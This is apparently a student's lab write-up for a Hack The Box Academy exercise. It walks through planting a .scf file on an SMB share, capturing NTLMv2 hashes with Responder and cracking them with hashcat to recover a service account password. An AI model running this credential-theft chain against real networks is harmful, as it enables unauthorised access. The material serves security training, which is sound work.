# [Interacting with Users](Interacting%20with%20Users.md)
### Using the techniques in this section obtain the cleartext credentials for the SCCM_SVC user.

Create .scf file
![](Screenshot%202026-08-24%20at%2014.16.32.png)

Go to smb share to upload .scf file onto

```shell
smbclient "//10.129.127.84/Department Shares" -U htb-student%HTB_@cademy_stdnt!
```
![](Screenshot%202026-08-24%20at%2014.17.17.png)![](Screenshot%202026-08-24%20at%2014.17.28.png)

Open responder to catch NTLMv2 Hash
```shell
sudo responder -w -v -I tun0
```
![](Screenshot%202026-08-24%20at%2014.18.29.png)

Lastly, decrypt the hash and get the password
```shell
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-08-24%20at%2014.20.15.png)
